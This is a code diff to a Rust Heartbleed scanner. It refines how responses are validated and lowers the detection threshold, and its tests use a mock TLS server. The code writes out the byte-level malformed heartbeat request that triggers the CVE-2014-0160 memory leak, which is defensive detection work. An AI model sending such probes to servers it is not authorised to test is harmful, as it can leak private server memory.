@@ -60,7 +60,12 @@ impl<'a> HeartbleedTester<'a> {
 
     /// Test specific protocol for Heartbleed
     async fn test_protocol(&self, protocol: Protocol) -> Result<HeartbleedResult> {
-        let addr = self.target.socket_addrs()[0];
+        let addr = self
+            .target
+            .socket_addrs()
+            .first()
+            .copied()
+            .ok_or_else(|| anyhow::anyhow!("No socket addresses available for target"))?;
 
         // Connect TCP
         let mut stream =
@@ -175,88 +180,174 @@ impl<'a> HeartbleedTester<'a> {
         false
     }
 
+    /// Validate that the response is a proper Heartbeat Response (not a TLS alert or other response).
+    /// Returns true if the response structure indicates a valid heartbeat response.
+    fn validate_heartbeat_response(&self, response: &[u8]) -> bool {
+        // Minimum valid heartbeat response: 5 (TLS record header) + 3 (heartbeat header) = 8 bytes
+        if response.len() < 8 {
+            return false;
+        }
+
+        // Check TLS record header
+        // Content type must be Heartbeat (0x18)
+        if response[0] != CONTENT_TYPE_HEARTBEAT {
+            tracing::debug!(
+                "Heartbleed: Response content type is not Heartbeat (0x{:02x}, expected 0x18)",
+                response[0]
+            );
+            return false;
+        }
+
+        // Version check (should be TLS 1.0, 1.1, or 1.2)
+        if response[1] != 0x03 || response[2] < 0x01 || response[2] > 0x03 {
+            tracing::debug!(
+                "Heartbleed: Response has unexpected TLS version 0x{:02x}{:02x}",
+                response[1],
+                response[2]
+            );
+            return false;
+        }
+
+        // Heartbeat message type must be Response (0x02), not Request (0x01)
+        // Response structure: type (1 byte) + length (2 bytes) + payload
+        let heartbeat_type = response[5];
+        if heartbeat_type != 0x02 {
+            tracing::debug!(
+                "Heartbleed: Response type is not HeartbeatResponse (0x{:02x}, expected 0x02)",
+                heartbeat_type
+            );
+            return false;
+        }
+
+        // If we got here, the response structure is valid
+        // Note: The actual vulnerability check compares the received length with our sent length
+        // A legitimate response would have a small length field, a vulnerable server would have
+        // a much larger length field (claiming 16384 bytes)
+        true
+    }
+
     /// Send malicious heartbeat request and check for memory leak
     async fn send_malicious_heartbeat(&self, stream: &mut TcpStream) -> Result<HeartbleedResult> {
         const HEARTBEAT_PAYLOAD_SENT: usize = 3;
         // Minimum suspicious response threshold.
         // A legitimate heartbeat response echoes our 3 bytes payload plus 3 bytes header (type + length).
         // TLS record overhead: 5 bytes (content type + version + length).
-        // Total legitimate: ~11 bytes minimum. We use 128 as a conservative threshold
-        // to avoid false positives from servers that include additional metadata.
-        // The malicious payload claims 0x4000 (16384) bytes, so any response >128 is suspicious.
+        // Total legitimate: ~11 bytes minimum.
+        //
+        // CRITICAL: We must distinguish between legitimate heartbeat responses and memory leaks.
+        // A legitimate Heartbeat Response (type 0x02) would echo our 3 bytes payload + 3 bytes header
+        // = 6 bytes, plus 5 bytes TLS record = 11 bytes total.
+        //
+        // A vulnerable server returns the claimed length (16384 bytes) which is far larger.
+        // We use 16 bytes as threshold to avoid false positives from minimal echo responses
+        // while still catching small leaks (some vulnerable implementations leak ~32-64 bytes).
+        //
+        // Response structure validation:
+        // - Content type must be Heartbeat (0x18)
+        // - Heartbeat message type must be Response (0x02), not Request (0x01)
+        // - Payload length field claims more bytes than we sent
+        //
         // See: CVE-2014-0160 - heartbeat allows reading up to 64KB of memory.
-        const MIN_SUSPICIOUS_RESPONSE: usize = 128;
+        const MIN_SUSPICIOUS_RESPONSE: usize = 16;
+        // Responses below this threshold warrant manual verification warning
+        const WARNING_THRESHOLD: usize = 32;
 
         // Build malicious heartbeat request
-        let mut heartbeat = Vec::new();
-
-        // Record header
-        heartbeat.push(CONTENT_TYPE_HEARTBEAT); // Content Type: Heartbeat (0x18)
-        heartbeat.push((VERSION_TLS_1_2 >> 8) as u8); // Version: TLS 1.2 (0x0303)
-        heartbeat.push((VERSION_TLS_1_2 & 0xff) as u8);
-
-        // Record length
-        heartbeat.push(0x00);
-        heartbeat.push(0x03); // 3 bytes payload
-
-        // Heartbeat request
-        heartbeat.push(HEARTBEAT_REQUEST); // Type: Request (0x01)
-        heartbeat.push(0x40); // Payload length: 16384 (0x4000) - MALICIOUS!
-        heartbeat.push(0x00);
+        let heartbeat = vec![
+            CONTENT_TYPE_HEARTBEAT,       // Record header: Content Type: Heartbeat (0x18)
+            (VERSION_TLS_1_2 >> 8) as u8, // Version: TLS 1.2 (0x0303)
+            (VERSION_TLS_1_2 & 0xff) as u8, // Version low byte
+            0x00,                         // Record length high byte
+            0x03,                         // 3 bytes payload
+            HEARTBEAT_REQUEST,            // Heartbeat request type
+            0x40,                         // Payload length: 16384 (0x4000) - MALICIOUS!
+            0x00,
+        ];
 
         // Send heartbeat request
-        match timeout(self.read_timeout, async {
+        let result = match timeout(self.read_timeout, async {
             stream.write_all(&heartbeat).await?;
 
             // Read response
             let mut response = vec![0u8; 65535];
-            stream.read(&mut response).await
+            let n = stream.read(&mut response).await?;
+            response.truncate(n);
+            Ok::<Vec<u8>, anyhow::Error>(response)
         })
         .await
         {
-            Ok(Ok(n)) => {
-                let vulnerable = n > MIN_SUSPICIOUS_RESPONSE;
-                let details = if vulnerable {
-                    format!(
-                        "VULNERABLE: Heartbleed detected. Received {} bytes (sent only {} bytes). Memory leak confirmed.",
-                        n, HEARTBEAT_PAYLOAD_SENT
-                    )
-                } else if n == 0 {
-                    "Connection closed by server - likely not vulnerable (server rejected malformed heartbeat)".to_string()
-                } else {
-                    format!(
-                        "Not vulnerable - Received {} bytes (expected echo of {} bytes, threshold: {})",
-                        n, HEARTBEAT_PAYLOAD_SENT, MIN_SUSPICIOUS_RESPONSE
-                    )
-                };
-
-                Ok(HeartbleedResult {
-                    vulnerable,
-                    bytes_received: n,
+            Ok(Ok(response)) => response,
+            Ok(Err(_)) => {
+                return Ok(HeartbleedResult {
+                    vulnerable: false,
+                    bytes_received: 0,
                     bytes_sent: HEARTBEAT_PAYLOAD_SENT,
-                    details,
-                    tested: true,
-                })
+                    details:
+                        "Connection error during heartbeat test - server may have closed connection"
+                            .to_string(),
+                    tested: false,
+                });
             }
-            Ok(Err(_)) => Ok(HeartbleedResult {
-                vulnerable: false,
-                bytes_received: 0,
-                bytes_sent: HEARTBEAT_PAYLOAD_SENT,
-                details:
-                    "Connection error during heartbeat test - server may have closed connection"
-                        .to_string(),
-                tested: false,
-            }),
-            Err(_) => Ok(HeartbleedResult {
-                vulnerable: false,
-                bytes_received: 0,
-                bytes_sent: HEARTBEAT_PAYLOAD_SENT,
-                details:
-                    "Timeout waiting for heartbeat response - server may have closed connection"
-                        .to_string(),
-                tested: false,
-            }),
-        }
+            Err(_) => {
+                return Ok(HeartbleedResult {
+                    vulnerable: false,
+                    bytes_received: 0,
+                    bytes_sent: HEARTBEAT_PAYLOAD_SENT,
+                    details:
+                        "Timeout waiting for heartbeat response - server may have closed connection"
+                            .to_string(),
+                    tested: false,
+                });
+            }
+        };
+
+        let n = result.len();
+
+        // Validate response structure
+        let is_valid_heartbeat_response = self.validate_heartbeat_response(&result);
+
+        // If response doesn't look like a valid heartbeat response, it's suspicious
+        // (server might be returning an error or TLS alert)
+        let vulnerable = n > MIN_SUSPICIOUS_RESPONSE && is_valid_heartbeat_response;
+        let details = if vulnerable {
+            if n < WARNING_THRESHOLD {
+                format!(
+                    "VULNERABLE: Heartbleed detected with {} bytes. \
+                     NOTE: Response size is small ({} bytes), manual verification recommended. \
+                     Received {} bytes (sent {} bytes).",
+                    n, n, n, HEARTBEAT_PAYLOAD_SENT
+                )
+            } else {
+                format!(
+                    "VULNERABLE: Heartbleed detected. Received {} bytes (sent {} bytes). Memory leak confirmed.",
+                    n, HEARTBEAT_PAYLOAD_SENT
+                )
+            }
+        } else if n == 0 {
+            "Connection closed by server during heartbeat test - inconclusive. \
+             Server may have rejected malformed heartbeat (not vulnerable) or \
+             may have crashed (potentially vulnerable). Manual verification recommended."
+                .to_string()
+        } else if !is_valid_heartbeat_response && n > 0 {
+            format!(
+                "Not vulnerable - Response does not appear to be a valid heartbeat response. \
+                 Received {} bytes. Manual verification recommended if server returned unexpected data.",
+                n
+            )
+        } else {
+            format!(
+                "Not vulnerable - Received {} bytes (expected echo of {} bytes, threshold: {})",
+                n, HEARTBEAT_PAYLOAD_SENT, MIN_SUSPICIOUS_RESPONSE
+            )
+        };
+
+        Ok(HeartbleedResult {
+            vulnerable,
+            bytes_received: n,
+            bytes_sent: HEARTBEAT_PAYLOAD_SENT,
+            details,
+            tested: n > 0, // Test is conclusive only if we received data
+        })
     }
 }
 
@@ -274,7 +365,37 @@ mod tests {
             if let Ok((mut socket, _)) = listener.accept().await {
                 let mut buffer = [0u8; 4096];
                 let _ = socket.read(&mut buffer).await;
-                let response = vec![0u8; response_size];
+
+                // Build a valid TLS Heartbeat Response structure
+                // Content type: Heartbeat (0x18)
+                // Version: TLS 1.2 (0x0303)
+                // Length: response_size
+                // Heartbeat type: Response (0x02)
+                // Payload length: response_size - 3 (after type and length bytes)
+                // Payload: zeros
+
+                let mut response = Vec::new();
+                response.push(0x18); // Content type: Heartbeat
+                response.push(0x03); // Version TLS 1.2
+                response.push(0x03);
+
+                // Record length (2 bytes, big-endian)
+                // For heartbeat response: type(1) + length(2) + payload
+                let payload_len = response_size.saturating_sub(3);
+                let record_len = 3 + payload_len;
+                response.push((record_len >> 8) as u8);
+                response.push((record_len & 0xff) as u8);
+
+                // Heartbeat response type (0x02)
+                response.push(0x02);
+
+                // Payload length (2 bytes, big-endian)
+                response.push((payload_len >> 8) as u8);
+                response.push((payload_len & 0xff) as u8);
+
+                // Payload (zeros)
+                response.extend(vec![0u8; payload_len]);
+
                 let _ = socket.write_all(&response).await;
             }
         });
@@ -409,12 +530,16 @@ mod tests {
         let mut stream = TcpStream::connect(addr).await.unwrap();
         let result = tester.send_malicious_heartbeat(&mut stream).await.unwrap();
         assert!(result.vulnerable);
-        assert!(result.bytes_received > 128);
+        assert!(result.bytes_received > 16); // Above the threshold for vulnerability detection
     }
 
     #[tokio::test]
     async fn test_send_malicious_heartbeat_no_leak() {
-        let port = spawn_heartbeat_server(10).await;
+        // Use a response size below the threshold to simulate a non-vulnerable server
+        // A legitimate heartbeat echo would be ~11 bytes (3 payload + 3 header + 5 TLS record)
+        // but we use 0 bytes to simulate a server that closes the connection immediately
+        // or returns an error without leaking memory
+        let port = spawn_heartbeat_server(0).await;
         let target = Target::with_ips(
             "localhost".to_string(),
             port,
@@ -426,5 +551,6 @@ mod tests {
         let mut stream = TcpStream::connect(addr).await.unwrap();
         let result = tester.send_malicious_heartbeat(&mut stream).await.unwrap();
         assert!(!result.vulnerable);
+        // Note: tested may be false if 0 bytes received (connection closed)
     }
 }
